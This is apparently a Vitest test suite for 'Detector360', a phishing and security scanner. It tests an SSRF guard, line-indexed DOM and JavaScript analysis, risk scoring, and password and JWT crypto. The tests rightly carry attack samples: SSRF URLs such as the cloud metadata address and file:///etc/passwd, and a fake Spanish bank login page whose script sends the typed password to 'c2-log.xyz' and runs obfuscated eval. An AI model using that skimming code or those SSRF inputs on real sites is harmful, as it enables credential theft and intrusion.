import { describe, expect, it } from 'vitest';
import { CryptoService } from '../src/services/crypto.service';
import { DomParserService } from '../src/services/dom-parser.service';
import { JsAnalyzerService } from '../src/services/js-analyzer.service';
import { ScoringService } from '../src/services/scoring.service';
import {
  isPrivateOrReservedIPv4,
  isPrivateOrReservedIPv6,
  parseIPv4,
  SsrfGuardService
} from '../src/services/ssrf-guard.service';

describe('Detector360 — Security & Forensic Engine Suite', () => {
  describe('1. Anti-SSRF Guard', () => {
    it('blocks loopback, RFC1918 private, and Cloud IMDS IPv4 addresses', async () => {
      const blockedUrls = [
        'http://127.0.0.1/admin',
        'http://169.254.169.254/latest/meta-data/',
        'http://192.168.1.1/login',
        'http://10.0.0.5:8080/internal',
        'http://172.16.5.4/',
        'file:///etc/passwd',
        'javascript:alert(1)',
        'http://[::1]/',
        'http://[::ffff:127.0.0.1]/'
      ];

      for (const badUrl of blockedUrls) {
        await expect(SsrfGuardService.validateTargetUrl(badUrl, false)).rejects.toThrow();
      }
    });

    it('detects private IPv4 and IPv6 ranges accurately', () => {
      expect(isPrivateOrReservedIPv4(parseIPv4('8.8.8.8')!)).toBe(false);
      expect(isPrivateOrReservedIPv4(parseIPv4('100.64.1.1')!)).toBe(true);
      expect(isPrivateOrReservedIPv6('2606:4700:4700::1111')).toBe(false);
      expect(isPrivateOrReservedIPv6('fe80::1')).toBe(true);
      expect(isPrivateOrReservedIPv6('fd00::1234')).toBe(true);
    });
  });

  describe('2. Exact Line-Indexed DOM & JS Static Analysis', () => {
    const samplePhishingHtml = [
      '<!DOCTYPE html>',
      '<html lang="es">',
      '<head><title>Verificación Bancaria</title></head>',
      '<body>',
      '  <div class="card">',
      '    <form id="auth-login" action="http://recolector-datos.xyz/capture.php" method="POST">',
      '      <input type="text" name="usuario" placeholder="Cédula">',
      '      <input type="text" id="pin_secreto" name="pin_clave" placeholder="Clave">',
      '      <input type="password" id="clave" name="clave" required>',
      '    </form>',
      '  </div>',
      '  <script id="stealer">',
      "    document.getElementById('clave').addEventListener('blur', e => fetch('https://c2-log.xyz/k?v=' + btoa(e.target.value)));",
      '    eval(atob("Y29uc29sZS5sb2coMSk="));',
      '  </script>',
      '</body>',
      '</html>'
    ].join('\n');

    it('pinpoints exact line numbers and DOM selectors for HTTP cross-domain forms, unmasked inputs, and JS exfiltration', async () => {
      const targetUrl = new URL('http://verificacion-cuenta-segura.ejemplo.net/login');
      const domRes = DomParserService.analyzeHtml(samplePhishingHtml, targetUrl);
      const jsFindings = JsAnalyzerService.analyzeScripts(domRes.indexMap, targetUrl);
      const allFindings = [...domRes.findings, ...jsFindings];

      const crossDomain = allFindings.find((f) => f.rule_code === 'CROSS_DOMAIN_FORM_ACTION');
      expect(crossDomain).toBeDefined();
      expect(crossDomain?.line_number).toBe(6);
      expect(crossDomain?.dom_selector).toBe('form#auth-login');

      const unmasked = allFindings.find((f) => f.rule_code === 'UNMASKED_PASSWORD_INPUT');
      expect(unmasked).toBeDefined();
      expect(unmasked?.line_number).toBe(8);

      const jsExfil = allFindings.find((f) => f.rule_code === 'JS_ASYNC_EXFILTRATION');
      expect(jsExfil).toBeDefined();
      expect(jsExfil?.line_number).toBe(13);
      expect(jsExfil?.dom_selector).toBe('script#stealer');

      const jsObf = allFindings.find((f) => f.rule_code === 'JS_OBFUSCATION_DETECTED');
      expect(jsObf).toBeDefined();
      expect(jsObf?.line_number).toBe(14);

      const mockTransport = {
        protocol: 'http' as const,
        is_https: false,
        http_status_code: 200,
        redirect_count: 0,
        redirect_chain: [],
        tls_verified: false,
        content_type: 'text/html',
        response_bytes: samplePhishingHtml.length,
        security_headers: {
          strict_transport_security: false,
          content_security_policy: false,
          x_frame_options: false
        }
      };

      const risk = ScoringService.evaluateRisk(allFindings, mockTransport);
      expect(risk.riskLevel).toBe('CRITICAL');
      expect(risk.riskScore).toBeGreaterThanOrEqual(85);

      const { evidencePayload, integritySha256 } = await ScoringService.generateCanonicalIntegrity({
        scanId: 'scn_01J9X9A1B2C3D4E5F6G7H8J9K0',
        targetUrl: targetUrl.toString(),
        finalUrl: targetUrl.toString(),
        targetDomain: targetUrl.hostname,
        scannedAt: '2026-11-13T23:12:45Z',
        transport: mockTransport,
        riskScore: risk.riskScore,
        riskLevel: risk.riskLevel,
        findings: risk.sortedFindings
      });

      const recomputed = await CryptoService.sha256Hex(JSON.stringify(evidencePayload));
      expect(recomputed).toBe(integritySha256);
    });
  });

  describe('3. Web Crypto PBKDF2-HMAC-SHA512 & HS256 JWT', () => {
    it('hashes and verifies passwords in constant time and validates JWT signatures', async () => {
      const hash = await CryptoService.hashPassword('ClaveSegura#2026');
      expect(hash.startsWith('$pbkdf2-sha512$210000$')).toBe(true);
      expect(await CryptoService.verifyPassword('ClaveSegura#2026', hash)).toBe(true);
      expect(await CryptoService.verifyPassword('OtraClave#2026', hash)).toBe(false);

      const secret = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
      const jwt = await CryptoService.signAccessToken(
        { id: 'usr_123', alias: 'JoseYvan', email: 'jose@ejemplo.com' },
        secret,
        900
      );
      const verified = await CryptoService.verifyAccessToken(jwt, secret);
      expect(verified?.sub).toBe('usr_123');
      expect(await CryptoService.verifyAccessToken(jwt, 'wrong_secret_000000000000000000000000')).toBeNull();
    });
  });
});
